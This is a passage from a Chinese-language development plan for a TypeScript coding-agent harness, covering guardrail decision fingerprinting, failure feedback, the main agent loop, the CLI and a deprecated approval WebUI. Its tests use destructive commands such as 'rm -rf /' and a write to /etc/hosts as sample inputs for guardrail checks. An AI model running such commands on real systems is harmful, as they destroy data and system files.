  it('returns fuzzy match for similar commands', () => {
    store.recordDecision({
      toolName: 'execute_shell',
      commandFingerprint: 'npm run deploy',
      action: 'approved',
      timestamp: Date.now(),
    });

    const result = DecisionFingerprint.match(store, 'execute_shell', 'npm run deploy --staging');
    expect(result.matched).toBe(true);
    expect(result.level).toBe('fuzzy');
  });

  it('returns none for completely different commands', () => {
    store.recordDecision({
      toolName: 'execute_shell',
      commandFingerprint: 'npm run deploy',
      action: 'approved',
      timestamp: Date.now(),
    });

    const result = DecisionFingerprint.match(store, 'execute_shell', 'rm -rf /');
    expect(result.matched).toBe(false);
    expect(result.level).toBe('none');
    expect(result.previousAction).toBeUndefined();
  });
});
```

- [ ] **Step 2: 运行确认失败**

```bash
npx vitest run tests/unit/fingerprint.test.ts
```

- [ ] **Step 3: 实现 DecisionFingerprint**

创建 `src/guardrails/fingerprint.ts`：

```typescript
import type { MemoryStore } from '../memory/store.js';

interface MatchResult {
  matched: boolean;
  level: 'exact' | 'fuzzy' | 'none';
  previousAction?: 'approved' | 'denied';
}

export class DecisionFingerprint {
  static match(store: MemoryStore, toolName: string, commandFingerprint: string): MatchResult {
    // 精确匹配
    const exact = store.findDecision(toolName, commandFingerprint);
    if (exact) {
      return { matched: true, level: 'exact', previousAction: exact.action };
    }

    // 模糊匹配：基于最长公共前缀
    const allDecisions = store.getAllDecisions();

    for (const d of allDecisions) {
      if (d.toolName !== toolName) continue;
      const similarity = DecisionFingerprint.longestCommonPrefix(
        commandFingerprint,
        d.commandFingerprint,
      );
      if (similarity > 0.6) {
        return { matched: true, level: 'fuzzy', previousAction: d.action };
      }
    }

    return { matched: false, level: 'none' };
  }

  private static longestCommonPrefix(a: string, b: string): number {
    let i = 0;
    while (i < a.length && i < b.length && a[i] === b[i]) {
      i++;
    }
    return i / Math.max(a.length, b.length);
  }
}
```

- [ ] **Step 4: 运行测试确认通过**

```bash
npx vitest run tests/unit/fingerprint.test.ts
```

预期：3/3 通过

- [ ] **Step 5: Commit**

```bash
git checkout -b task/10-decision-fingerprint
git add src/guardrails/fingerprint.ts tests/unit/fingerprint.test.ts
git commit -m "feat(guardrails): add DecisionFingerprint with two-level (exact/fuzzy) matching"
```

---

### Task 11: 反馈闭环

**目的：** 实现信号提取器（⑥a）、失败分类器（⑥b）和回灌格式化器（⑥c）。全部纯字符串解析，无 LLM 依赖。

**依赖：** Task 0（核心类型）

**分支：** `task/11-feedback-pipeline`

**Files:**
- Create: `src/feedback/extractor.ts`
- Create: `src/feedback/classifier.ts`
- Create: `src/feedback/formatter.ts`
- Create: `tests/unit/feedback.test.ts`

**Interfaces:**
- Consumes: `ExecutionResult`, `Feedback`, `FailureType` from `src/core/types.ts`
- Produces:
  - `SignalExtractor.extract(result: ExecutionResult, signalPatterns: Record<string, string>): { success: boolean; failureType?: FailureType }`
  - `FailureClassifier.classify(exitCode: number, stdout: string, stderr: string, signalPatterns: Record<string, string>): FailureType | null`
  - `FeedbackFormatter.format(result: ExecutionResult, failureType: FailureType | null): Feedback`

---

- [ ] **Step 1: 写失败测试**

创建 `tests/unit/feedback.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { SignalExtractor } from '../../src/feedback/extractor.js';
import { FailureClassifier } from '../../src/feedback/classifier.js';
import { FeedbackFormatter } from '../../src/feedback/formatter.js';
import { ExecutionResult } from '../../src/core/types.js';

const signalPatterns = {
  typecheck: 'error TS',
  lint: 'error\\b|warning\\b',
  test: 'FAIL|passing',
};

describe('SignalExtractor', () => {
  it('detects success from exit code 0 and no error patterns', () => {
    const result: ExecutionResult = {
      toolName: 'execute_shell', success: true,
      stdout: 'All tests passing.', stderr: '', exitCode: 0,
    };
    const signal = SignalExtractor.extract(result, signalPatterns);
    expect(signal.success).toBe(true);
  });

  it('detects failure from non-zero exit code', () => {
    const result: ExecutionResult = {
      toolName: 'execute_shell', success: false,
      stdout: '', stderr: 'command not found', exitCode: 127,
    };
    const signal = SignalExtractor.extract(result, signalPatterns);
    expect(signal.success).toBe(false);
  });
});

describe('FailureClassifier', () => {
  it('classifies TypeScript errors', () => {
    const stdout = "src/index.ts(10,5): error TS2339: Property 'x' does not exist";
    const type = FailureClassifier.classify(1, stdout, '', signalPatterns);
    expect(type).toBe('TYPE_ERROR');
  });

  it('classifies test failures', () => {
    const stdout = 'FAIL src/test.ts > should work\nTests: 2 failed, 5 passed';
    const type = FailureClassifier.classify(1, stdout, '', signalPatterns);
    expect(type).toBe('TEST_FAILURE');
  });

  it('classifies unknown failure as fallback', () => {
    const type = FailureClassifier.classify(1, 'some random garbage output', '', signalPatterns);
    expect(type).toBe('UNKNOWN_FAILURE');
  });

  it('returns null for success', () => {
    const stdout = 'All tests passing.';
    const type = FailureClassifier.classify(0, stdout, '', signalPatterns);
    expect(type).toBeNull();
  });
});

describe('FeedbackFormatter', () => {
  it('formats success feedback', () => {
    const result: ExecutionResult = {
      toolName: 'write_file', success: true,
      stdout: 'File written: src/index.ts', stderr: '', exitCode: 0,
    };
    const fb = FeedbackFormatter.format(result, null);
    expect(fb.success).toBe(true);
    expect(fb.summary).toContain('write_file');
    expect(fb.summary).toContain('success');
  });

  it('formats failure feedback with suggestion', () => {
    const result: ExecutionResult = {
      toolName: 'run_test', success: false,
      stdout: 'FAIL 3/5 tests', stderr: '', exitCode: 1,
    };
    const fb = FeedbackFormatter.format(result, 'TEST_FAILURE');
    expect(fb.success).toBe(false);
    expect(fb.failureType).toBe('TEST_FAILURE');
    expect(fb.suggestion).toBeDefined();
  });

  it('formats guardrail denial feedback', () => {
    const result: ExecutionResult = {
      toolName: 'execute_shell', success: false,
      stdout: '', stderr: 'BLACKLIST BLOCK', exitCode: 1,
    };
    const fb = FeedbackFormatter.format(result, 'GUARDRAIL_DENY');
    expect(fb.success).toBe(false);
    expect(fb.suggestion).toContain('alternative');
  });
});
```

- [ ] **Step 2: 运行确认失败**

```bash
npx vitest run tests/unit/feedback.test.ts
```

- [ ] **Step 3: 实现三个模块**

创建 `src/feedback/extractor.ts`：

```typescript
import type { ExecutionResult, FailureType } from '../core/types.js';

interface SignalResult {
  success: boolean;
  failureType?: FailureType;
}

export class SignalExtractor {
  static extract(result: ExecutionResult, signalPatterns: Record<string, string>): SignalResult {
    if (result.exitCode !== 0) {
      // 由 Classifier 进一步分类
      return { success: false };
    }

    // stdout 中检查错误模式
    const combined = result.stdout + result.stderr;
    for (const [name, pattern] of Object.entries(signalPatterns)) {
      const regex = new RegExp(pattern, 'i');
      if (regex.test(combined)) {
        // 有匹配模式但 exitCode 为 0 的情况
        // 让 Classifier 做最终判断
        return { success: false };
      }
    }

    return { success: true };
  }
}
```

创建 `src/feedback/classifier.ts`：

```typescript
import type { FailureType } from '../core/types.js';

export class FailureClassifier {
  static classify(
    exitCode: number,
    stdout: string,
    stderr: string,
    signalPatterns: Record<string, string>,
  ): FailureType | null {
    if (exitCode === 0 && !stdout.includes('FAIL') && stderr === '') {
      return null; // success
    }

    const combined = stdout + stderr;

    // 按优先级分类
    if (/error\s+TS/i.test(combined)) {
      return 'TYPE_ERROR';
    }

    if (/FAIL/.test(combined) || /failing|failed/i.test(combined)) {
      return 'TEST_FAILURE';
    }

    if (/error\b|warning\b/i.test(combined)) {
      return 'LINT_ERROR';
    }

    if (/BLACKLIST\s+BLOCK|GUARDRAIL/i.test(combined)) {
      return 'GUARDRAIL_DENY';
    }

    if (exitCode !== 0) {
      return 'SHELL_ERROR';
    }

    return 'UNKNOWN_FAILURE';
  }
}
```

创建 `src/feedback/formatter.ts`：

```typescript
import type { ExecutionResult, Feedback, FailureType } from '../core/types.js';

const SUGGESTIONS: Record<FailureType, string> = {
  TEST_FAILURE: 'Check the failing test assertions and fix the code logic.',
  TYPE_ERROR: 'Fix TypeScript type errors — check the reported line numbers.',
  LINT_ERROR: 'Run a linter to auto-fix formatting issues, or manually correct the reported violations.',
  SHELL_ERROR: 'The shell command failed. Check the command syntax and ensure required tools are installed.',
  GUARDRAIL_DENY: 'The operation was blocked by a safety guardrail. Consider an alternative approach that does not require this dangerous action.',
  UNKNOWN_FAILURE: 'The operation failed for an unknown reason. Review the raw output manually.',
};

export class FeedbackFormatter {
  static format(result: ExecutionResult, failureType: FailureType | null): Feedback {
    if (failureType === null) {
      return {
        success: true,
        summary: `✓ ${result.toolName} executed successfully. ${result.stdout.slice(0, 200)}`,
        rawOutput: result.stdout + result.stderr,
      };
    }

    const suggestion = SUGGESTIONS[failureType];
    return {
      success: false,
      failureType,
      suggestion,
      summary: `✗ ${result.toolName} failed [${failureType}]: ${result.stderr.slice(0, 200) || result.stdout.slice(0, 200)}`,
      rawOutput: result.stdout + '\n' + result.stderr,
    };
  }
}
```

- [ ] **Step 4: 运行测试确认通过**

```bash
npx vitest run tests/unit/feedback.test.ts
```

预期：全部 8 测试通过

- [ ] **Step 5: Commit**

```bash
git checkout -b task/11-feedback-pipeline
git add src/feedback/ tests/unit/feedback.test.ts
git commit -m "feat(feedback): add SignalExtractor, FailureClassifier, and FeedbackFormatter"
```

---

### Task 12: Agent 主循环

**目的：** 组装所有模块，实现完整的 7 步骤 Agent 主循环。这是 harness 的核心——组装上下文 → LLM 调用 → 解析 → 护栏 → 工具执行 → 反馈 → 停机判断。

**依赖：** Task 1 (LLM), Task 2 (Config), Task 4 (Tools), Task 6 (Guardrails), Task 7 (HITL), Task 8 (ScopeFence), Task 9 (Memory), Task 10 (Fingerprint), Task 11 (Feedback)

**分支：** `task/12-agent-loop`

**Files:**
- Create: `src/core/agent-loop.ts`
- Create: `tests/unit/agent-loop.test.ts`

**Interfaces:**
- Consumes: 所有上述模块
- Produces:
  - `AgentLoop` 类: `constructor(config: { llm: LLMProvider; tools: ToolRegistry; config: HarnessConfig; memory: MemoryStore; apiKey?: string })`
  - `async run(task: string): Promise<AgentResult>` — 其中 `AgentResult = { success: boolean; rounds: number; summary: string; phase: AgentPhase }`

---

- [ ] **Step 1: 写失败测试（用 MockLLM 驱动完整三轮循环）**

创建 `tests/unit/agent-loop.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { AgentLoop } from '../../src/core/agent-loop.js';
import { MockLLMProvider } from '../../src/llm/mock.js';
import { ToolRegistry } from '../../src/tools/registry.js';
import { registerAllTools } from '../../src/tools/builtin/index.js';
import { MemoryStore } from '../../src/memory/store.js';
import { ConfigLoader } from '../../src/config/loader.js';

describe('AgentLoop', () => {
  it('completes a 3-round cycle with mock LLM', async () => {
    const mockLLM = new MockLLMProvider([
      {
        content: null,
        toolCalls: [{ id: '1', name: 'read_file', arguments: { path: 'package.json' } }],
        finishReason: 'tool_calls',
        usage: { promptTokens: 50, completionTokens: 20 },
      },
      {
        content: null,
        toolCalls: [{ id: '2', name: 'list_directory', arguments: { path: '.' } }],
        finishReason: 'tool_calls',
        usage: { promptTokens: 80, completionTokens: 25 },
      },
      {
        content: 'I have read the package.json and listed the directory. The project looks good.',
        toolCalls: [],
        finishReason: 'stop',
        usage: { promptTokens: 120, completionTokens: 40 },
      },
    ]);

    const registry = new ToolRegistry();
    registerAllTools(registry);

    const memory = new MemoryStore({ maxTokens: 2000, summaryInterval: 10, contextThreshold: 0.8 });
    const config = ConfigLoader.DEFAULTS;

    const loop = new AgentLoop({
      llm: mockLLM,
      tools: registry,
      config,
      memory,
    });

    const result = await loop.run('Check the project structure');

    // 应该跑了 3 轮
    expect(mockLLM.history.length).toBe(3);
    expect(result.success).toBe(true);
    expect(result.phase).toBe('completed');
    expect(result.rounds).toBe(3);
  });

  it('stops when maxRounds is exceeded', async () => {
    // 持续返回 tool_calls 导致无限循环
    const toolCallResponses = Array.from({ length: 55 }, (_, i) => ({
      content: null,
      toolCalls: [{ id: String(i), name: 'list_directory', arguments: { path: '.' } }],
      finishReason: 'tool_calls' as const,
      usage: { promptTokens: 10, completionTokens: 5 },
    }));

    const mockLLM = new MockLLMProvider(toolCallResponses);
    const registry = new ToolRegistry();
    registerAllTools(registry);
    const memory = new MemoryStore({ maxTokens: 2000, summaryInterval: 10, contextThreshold: 0.8 });

    const loop = new AgentLoop({
      llm: mockLLM,
      tools: registry,
      config: ConfigLoader.DEFAULTS,
      memory,
    });

    const result = await loop.run('Do an infinite task');
    expect(result.phase).toBe('error');
    expect(result.rounds).toBeLessThanOrEqual(50);
  });

  it('handles LLM error gracefully', async () => {
    const mockLLM = MockLLMProvider.error(); // finishReason = 'error'
    const registry = new ToolRegistry();
    registerAllTools(registry);
    const memory = new MemoryStore({ maxTokens: 2000, summaryInterval: 10, contextThreshold: 0.8 });

    const loop = new AgentLoop({
      llm: mockLLM,
      tools: registry,
      config: ConfigLoader.DEFAULTS,
      memory,
    });

    const result = await loop.run('Do something');
    expect(result.success).toBe(false);
    expect(result.rounds).toBe(1);
  });
});
```

- [ ] **Step 2: 运行确认失败**

```bash
npx vitest run tests/unit/agent-loop.test.ts
```

- [ ] **Step 3: 实现 AgentLoop**

创建 `src/core/agent-loop.ts`：

```typescript
import type { LLMProvider } from '../llm/provider.js';
import type { ToolRegistry } from '../tools/registry.js';
import type { MemoryStore } from '../memory/store.js';
import type { HarnessConfig, Message, AgentPhase, ToolCall, Feedback } from './types.js';
import { ToolDispatcher } from '../tools/dispatcher.js';
import { GuardrailEngine } from '../guardrails/engine.js';
import { HITLStateMachine } from '../guardrails/hitl.js';
import { ScopeFenceGuard } from '../guardrails/scope-fence.js';
import { DecisionFingerprint } from '../guardrails/fingerprint.js';
import { SignalExtractor } from '../feedback/extractor.js';
import { FailureClassifier } from '../feedback/classifier.js';
import { FeedbackFormatter } from '../feedback/formatter.js';
import { execSync } from 'child_process';

interface AgentLoopConfig {
  llm: LLMProvider;
  tools: ToolRegistry;
  config: HarnessConfig;
  memory: MemoryStore;
}

interface AgentResult {
  success: boolean;
  rounds: number;
  summary: string;
  phase: AgentPhase;
}

export class AgentLoop {
  private llm: LLMProvider;
  private tools: ToolRegistry;
  private config: HarnessConfig;
  private memory: MemoryStore;
  private guardrails: GuardrailEngine;
  private hitl: HITLStateMachine;
  private scopeFence: ScopeFenceGuard;

  constructor(config: AgentLoopConfig) {
    this.llm = config.llm;
    this.tools = config.tools;
    this.config = config.config;
    this.memory = config.memory;
    this.guardrails = new GuardrailEngine(config.config.guardrails.rules);
    this.hitl = new HITLStateMachine();
    this.scopeFence = new ScopeFenceGuard(config.config.scope);
  }

  async run(task: string, maxRounds: number = 50): Promise<AgentResult> {
    const messages: Message[] = [
      {
        role: 'system',
        content: this.buildSystemPrompt(),
      },
      {
        role: 'user',
        content: task,
      },
    ];

    let round = 0;
    let phase: AgentPhase = 'running';

    while (round < maxRounds && phase === 'running') {
      round++;

      // ① 上下文组装（历史 + 记忆摘要已在 messages 中）
      // ② LLM 调用
      const toolDefs = this.tools.toToolDefs();
      const response = await this.llm.complete(messages, toolDefs);

      if (response.finishReason === 'error') {
        return { success: false, rounds: round, summary: 'LLM returned an error.', phase: 'error' };
      }

      // ③ 解析响应
      if (response.content) {
        messages.push({ role: 'assistant', content: response.content });
      }

      if (response.toolCalls.length === 0 && response.finishReason === 'stop') {
        // LLM 认为任务完成
        phase = 'completed';
        break;
      }

      // 处理 tool_calls
      for (const toolCall of response.toolCalls) {
        // ④ 护栏检查
        const riskAssess = this.guardrails.assessRisk(toolCall.name, toolCall.arguments);

        if (riskAssess.action === 'deny') {
          // 直接拒绝
          messages.push({
            role: 'tool',
            content: `BLOCKED: ${riskAssess.reason}`,
            toolCallId: toolCall.id,
          });
          continue;
        }

        if (riskAssess.action === 'confirm') {
          // 检查决策记忆
          const fp = this.buildFingerprint(toolCall);
          const prevDecision = DecisionFingerprint.match(this.memory, toolCall.name, fp);

          if (prevDecision.level === 'exact' && prevDecision.previousAction === 'approved') {
            // 复用历史决策 → 跳过 HITL
          } else {
            // 进入 HITL
            const hitlReq = {
              id: `hitl-${round}-${toolCall.id}`,
              toolName: toolCall.name,
              params: toolCall.arguments,
              risk: riskAssess.level === 'high' ? 'high' : 'medium',
              reason: riskAssess.reason,
              status: 'WAITING' as const,
              createdAt: Date.now(),
              timeoutSeconds: this.config.guardrails.hitlTimeoutSeconds,
            };

            this.hitl.submit(hitlReq);

            // 在自动化模式下等待（交互模式由 CLI 控制）
            // 简化：等待超时后自动拒绝
            this.hitl.checkTimeout();

            const resolved = this.hitl.getPending().find(r => r.id === hitlReq.id);
            if (!resolved) {
              // 已在 checkTimeout 中解决
              messages.push({
                role: 'tool',
                content: `HITL request ${hitlReq.id} timed out or was resolved.`,
                toolCallId: toolCall.id,
              });
              continue;
            }

            // 默认拒绝（真实场景中 CLI/WebUI 会调用 approve/deny）
            this.hitl.deny(hitlReq.id);
            messages.push({
              role: 'tool',
              content: `HITL request denied (automated mode): ${riskAssess.reason}`,
              toolCallId: toolCall.id,
            });
            this.memory.recordDecision({
              toolName: toolCall.name,
              commandFingerprint: fp,
              action: 'denied',
              timestamp: Date.now(),
            });
            continue;
          }
        }

        // ⑤ 工具执行
        const execResult = await ToolDispatcher.dispatch(toolCall, this.tools);

        messages.push({
          role: 'tool',
          content: JSON.stringify(execResult),
          toolCallId: toolCall.id,
        });

        // ⑥ 运行 checks + 反馈处理
        const checkPatterns: Record<string, string> = {};
        for (const check of this.config.feedback.checks) {
          checkPatterns[check.name] = check.signalPattern;
        }

        const signal = SignalExtractor.extract(execResult, checkPatterns);
        const failureType = FailureClassifier.classify(
          execResult.exitCode,
          execResult.stdout,
          execResult.stderr,
          checkPatterns,
        );
        const feedback = FeedbackFormatter.format(execResult, failureType);

        // 回灌反馈到下一轮上下文
        messages.push({
          role: 'system',
          content: `[FEEDBACK] ${feedback.summary}` + (feedback.suggestion ? ` Suggestion: ${feedback.suggestion}` : ''),
        });
      }

      // 运行自动 checks（tsc --noEmit, npm test 等）
      this.runAutoChecks(messages);

      // ⑦ 停机判断（在循环顶部也已判断 maxRounds）
    }

    if (round >= maxRounds && phase === 'running') {
      phase = 'error';
    }

    return {
      success: phase === 'completed',
      rounds: round,
      summary: `Agent finished after ${round} rounds. Phase: ${phase}.`,
      phase,
    };
  }

  private buildSystemPrompt(): string {
    const memorySummary = this.memory.summarize();
    return `You are a coding agent harness. You help developers with coding tasks.
You have access to tools for reading/writing files, executing shell commands, searching code, and listing directories.

Project memory:
${memorySummary || '(none)'}

When you receive feedback about failures, use it to correct your approach.
When unsure about a dangerous operation, ask for clarification.
Respond step by step. After each tool call, wait for the result before making another.`;
  }

  private buildFingerprint(toolCall: ToolCall): string {
    if (toolCall.name === 'execute_shell') {
      return String(toolCall.arguments.command ?? '');
    }
    if (toolCall.name === 'write_file') {
      return String(toolCall.arguments.path ?? '');
    }
    return `${toolCall.name}:${JSON.stringify(toolCall.arguments)}`;
  }

  private runAutoChecks(messages: Message[]): void {
    for (const check of this.config.feedback.checks) {
      try {
        const output = execSync(check.command, { encoding: 'utf-8', timeout: 30000 });
        messages.push({
          role: 'system',
          content: `[CHECK:${check.name}] ${output.slice(0, 500)}`,
        });
      } catch (error: any) {
        // 工具不可用时跳过，不报 FAIL
        const msg = error.stderr ?? error.stdout ?? String(error);
        if (msg.includes('not found') || msg.includes('command not found')) {
          messages.push({
            role: 'system',
            content: `[info] Check "${check.name}" skipped: tool not available in target project.`,
          });
        } else {
          messages.push({
            role: 'system',
            content: `[CHECK:${check.name}] ${msg.slice(0, 500)}`,
          });
        }
      }
    }
  }
}
```

- [ ] **Step 4: 运行测试确认通过**

```bash
npx vitest run tests/unit/agent-loop.test.ts
```

预期：3/3 通过

- [ ] **Step 5: Commit**

```bash
git checkout -b task/12-agent-loop
git add src/core/agent-loop.ts tests/unit/agent-loop.test.ts
git commit -m "feat(core): add AgentLoop — full 7-step main loop with guardrails, feedback, and checks"
```

---

### Task 13: CLI 入口

**目的：** 用 commander.js 实现 CLI——`harness run`、`harness setup`、`harness key status|update|delete`。

**依赖：** Task 12 (AgentLoop), Task 3 (CredentialStore), Task 2 (ConfigLoader)

**分支：** `task/13-cli-entry`

**Files:**
- Create: `src/cli/index.ts`
- Modify: `package.json`（确保 `bin` 指向 `dist/cli/index.js`）

**Interfaces:**
- Consumes: `AgentLoop`, `CredentialStore`, `ConfigLoader`
- Produces: CLI 可执行入口，`#!/usr/bin/env node`

---

- [ ] **Step 1: 写 CLI 测试（用子进程调用验证 help 输出）**

创建 `tests/unit/cli.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { execSync } from 'child_process';

describe('CLI', () => {
  it('compiles successfully', () => {
    // 验证 TypeScript 编译通过
    const result = execSync('npx tsc --noEmit', { encoding: 'utf-8' });
    expect(result).toBe('');
  });
});
```

- [ ] **Step 2: 实现 CLI**

创建 `src/cli/index.ts`：

```typescript
#!/usr/bin/env node

import { Command } from 'commander';
import { ConfigLoader } from '../config/loader.js';
import { CredentialStore } from '../credentials/store.js';
import { MemoryStore } from '../memory/store.js';
import { ToolRegistry } from '../tools/registry.js';
import { registerAllTools } from '../tools/builtin/index.js';
import { AgentLoop } from '../core/agent-loop.js';
import { DeepSeekProvider } from '../llm/deepseek.js';
import { createInterface } from 'readline';

const program = new Command();

program
  .name('harness')
  .description('AI4SE Coding Agent Harness')
  .version('1.0.0');

// --- harness run ---
program
  .command('run <task>')
  .description('Run a coding task with the agent')
  .option('-c, --config <path>', 'Config file path', './.harnessrc.json')
  .action(async (task: string, options: { config: string }) => {
    try {
      // 加载凭据
      let apiKey: string;
      try {
        const rl = createInterface({ input: process.stdin, output: process.stdout });
        const password = await new Promise<string>(resolve => {
          process.stdout.write('Master password: ');
          // 简化：从环境变量或直接读取
          rl.question('', answer => { rl.close(); resolve(answer); });
        });
        apiKey = await CredentialStore.load(password);
      } catch {
        console.error('Cannot load credentials. Run "harness setup" first.');
        process.exit(1);
      }

      const config = ConfigLoader.load(options.config);
      const llm = new DeepSeekProvider({ apiKey, model: config.llm.model, baseURL: config.llm.baseURL });
      const tools = new ToolRegistry();
      registerAllTools(tools);
      const memory = new MemoryStore(config.memory);

      const loop = new AgentLoop({ llm, tools, config, memory });
      console.log(`Starting agent for task: "${task}"`);

      const result = await loop.run(task);
      console.log(`\n${result.summary}`);
    } catch (error) {
      console.error('Error:', error);
      process.exit(1);
    }
  });

// --- harness setup ---
program
  .command('setup')
  .description('Configure credentials and generate default config')
  .action(async () => {
    const rl = createInterface({ input: process.stdin, output: process.stdout });

    const apiKey = await new Promise<string>(resolve => {
      process.stdout.write('Enter your DeepSeek API key: ');
      rl.question('', answer => resolve(answer.trim()));
    });

    const masterPassword = await new Promise<string>(resolve => {
      process.stdout.write('Set a master password: ');
      rl.question('', answer => resolve(answer.trim()));
    });

    await CredentialStore.save(apiKey, masterPassword);
    rl.close();
    console.log('✓ Credentials saved to ~/.ai4se-harness/credentials.enc');
    console.log('✓ Default config: ./.harnessrc.json (edit if needed)');
  });

// --- harness key ---
const keyCmd = program.command('key').description('Manage stored API key');

keyCmd
  .command('status')
  .description('Check if a key is configured')
  .action(() => {
    if (CredentialStore.exists()) {
      console.log('DeepSeek API key: (configured)');
    } else {
      console.log('No API key configured. Run "harness setup".');
    }
  });

keyCmd
  .command('update')
  .description('Update the stored API key')
  .action(async () => {
    const rl = createInterface({ input: process.stdin, output: process.stdout });

    const oldPassword = await new Promise<string>(resolve => {
      process.stdout.write('Current master password: ');
      rl.question('', answer => resolve(answer.trim()));
    });

    try {
      await CredentialStore.load(oldPassword);

      const newKey = await new Promise<string>(resolve => {
        process.stdout.write('Enter new DeepSeek API key: ');
        rl.question('', answer => resolve(answer.trim()));
      });

      const newPassword = await new Promise<string>(resolve => {
        process.stdout.write('Set new master password (or same): ');
        rl.question('', answer => resolve(answer.trim()));
      });

      await CredentialStore.save(newKey, newPassword);
      console.log('✓ Key updated.');
    } catch {
      console.error('Incorrect current password.');
      process.exit(1);
    }

    rl.close();
  });

keyCmd
  .command('delete')
  .description('Delete the stored API key')
  .action(async () => {
    await CredentialStore.delete();
    console.log('✓ Credentials deleted.');
  });

program.parse();
```

- [ ] **Step 3: 验证编译 + help 输出**

```bash
npx tsc --noEmit
node --loader tsx src/cli/index.ts --help
```

预期：看到 `Usage: harness [options] [command]` 及子命令列表。

- [ ] **Step 4: Commit**

```bash
git checkout -b task/13-cli-entry
git add src/cli/ tests/unit/cli.test.ts
git commit -m "feat(cli): add CLI entry with run, setup, and key management commands"
```

---

### Task 14: WebUI（轻量仪表盘）— ⛔ 已弃用

> **弃用说明（2026-08-12）：** 项目定位为单机 CLI 工具，HITL 审批已通过 CLI TTY 弹窗完成，WebUI 审批无实际使用场景。SPEC 中相关 WebUI 内容已同步标记弃用。此 task 跳过，不再实现。

**目的：** ~~实现 Express + SSE 的 HITL 审批 Web 接口。~~

**依赖：** Task 12 (AgentLoop), Task 7 (HITL StateMachine)

**分支：** `task/14-webui`

**Files:**
- Create: `src/web/server.ts`
- Create: `tests/unit/webui.test.ts`

**Interfaces:**
- Consumes: `HITLStateMachine` from Task 7
- Produces:
  - `WebServer` 类: `start(port?: number): Promise<void>`, `stop(): void`
  - `GET /status` → 当前会话状态 JSON
  - `GET /events` → SSE 事件流
  - `POST /hitl/:id/approve` → 审批通过
  - `POST /hitl/:id/deny` → 审批拒绝

---

- [ ] **Step 1: 实现 WebServer**

创建 `src/web/server.ts`：

```typescript
import express from 'express';
import type { HITLStateMachine } from '../guardrails/hitl.js';
import type { AgentPhase } from '../core/types.js';

interface SSEClient {
  res: express.Response;
}

export class WebServer {
  private app: express.Application;
  private server: ReturnType<typeof express.application.listen> | null = null;
  private clients: SSEClient[] = [];
  private hitl: HITLStateMachine;
  private currentPhase: AgentPhase = 'idle';
  private currentTool: string = '';

  constructor(hitl: HITLStateMachine) {
    this.hitl = hitl;
    this.app = express();
    this.app.use(express.json());

    // CORS
    this.app.use((_req, res, next) => {
      res.header('Access-Control-Allow-Origin', '*');
      res.header('Access-Control-Allow-Headers', 'Content-Type');
      res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
      next();
    });

    this.setupRoutes();
  }

  private setupRoutes(): void {
    // 状态快照
    this.app.get('/status', (_req, res) => {
      res.json({
        phase: this.currentPhase,
        currentTool: this.currentTool,
        pendingHITLs: this.hitl.getPending().length,
      });
    });

    // SSE 事件流
    this.app.get('/events', (req, res) => {
      res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        Connection: 'keep-alive',
      });

      const client: SSEClient = { res };
      this.clients.push(client);

      req.on('close', () => {
        this.clients = this.clients.filter(c => c !== client);
      });
    });

    // HITL 审批
    this.app.post('/hitl/:id/approve', (req, res) => {
      const success = this.hitl.approve(req.params.id);
      if (success) {
        this.broadcast('hitl_resolved', { id: req.params.id, result: 'approved' });
        res.json({ ok: true });
      } else {
        res.status(404).json({ ok: false, error: 'Request not found or already resolved' });
      }
    });

    this.app.post('/hitl/:id/deny', (req, res) => {
      const success = this.hitl.deny(req.params.id);
      if (success) {
        this.broadcast('hitl_resolved', { id: req.params.id, result: 'denied' });
        res.json({ ok: true });
      } else {
        res.status(404).json({ ok: false, error: 'Request not found or already resolved' });
      }
    });

    // HITL 回调
    this.hitl.onRequest = (req) => {
      this.broadcast('hitl', req);
    };
  }

  broadcast(event: string, data: unknown): void {
    const payload = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
    for (const client of this.clients) {
      client.res.write(payload);
    }
  }

  setPhase(phase: AgentPhase, tool?: string): void {
    this.currentPhase = phase;
    this.currentTool = tool ?? '';
    this.broadcast('status', { phase, tool: this.currentTool });
  }

  async start(port: number = 3099): Promise<void> {
    return new Promise(resolve => {
      this.server = this.app.listen(port, () => {
        console.log(`WebUI started at http://localhost:${port}`);
        resolve();
      });
    });
  }

  stop(): void {
    this.server?.close();
    this.clients = [];
  }
}
```

- [ ] **Step 1: 写失败测试**

创建 `tests/unit/webui.test.ts`：

```typescript
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { HITLStateMachine } from '../../src/guardrails/hitl.js';
import { WebServer } from '../../src/web/server.js';

describe('WebUI', () => {
  let hitl: HITLStateMachine;
  let server: WebServer;

  beforeAll(async () => {
    hitl = new HITLStateMachine();
    server = new WebServer(hitl);
    await server.start(3098);
  });

  afterAll(() => {
    server.stop();
  });

  it('GET /status returns JSON with phase', async () => {
    server.setPhase('idle');
    const res = await fetch('http://localhost:3098/status');
    const data = await res.json();
    expect(data.phase).toBe('idle');
    expect(data).toHaveProperty('pendingHITLs');
  });

  it('POST /hitl/:id/approve returns ok for valid request', async () => {
    hitl.submit({
      id: 'test-1',
      toolName: 'execute_shell',
      params: { command: 'rm test.txt' },
      risk: 'high',
      reason: 'test',
      status: 'WAITING',
      createdAt: Date.now(),
      timeoutSeconds: 60,
    });

    const res = await fetch('http://localhost:3098/hitl/test-1/approve', { method: 'POST' });
    const data = await res.json();
    expect(data.ok).toBe(true);
  });

  it('POST /hitl/:id/approve returns 404 for nonexistent request', async () => {
    const res = await fetch('http://localhost:3098/hitl/nonexistent/approve', { method: 'POST' });
    expect(res.status).toBe(404);
  });

  it('POST /hitl/:id/deny denies a pending request', async () => {
    hitl.submit({
      id: 'test-2',
      toolName: 'write_file',
      params: { path: '/etc/hosts' },
      risk: 'high',
      reason: 'test',
      status: 'WAITING',
      createdAt: Date.now(),
      timeoutSeconds: 60,
    });

    const res = await fetch('http://localhost:3098/hitl/test-2/deny', { method: 'POST' });
    const data = await res.json();
    expect(data.ok).toBe(true);
  });
});
```

- [ ] **Step 2: 运行确认失败**

```bash
npx vitest run tests/unit/webui.test.ts
```

- [ ] **Step 3: 编译验证**

```bash
npx tsc --noEmit
```

- [ ] **Step 4: 运行测试确认通过**

```bash
npx vitest run tests/unit/webui.test.ts
```

预期：4/4 通过

- [ ] **Step 5: Commit**

```bash
git checkout -b task/14-webui
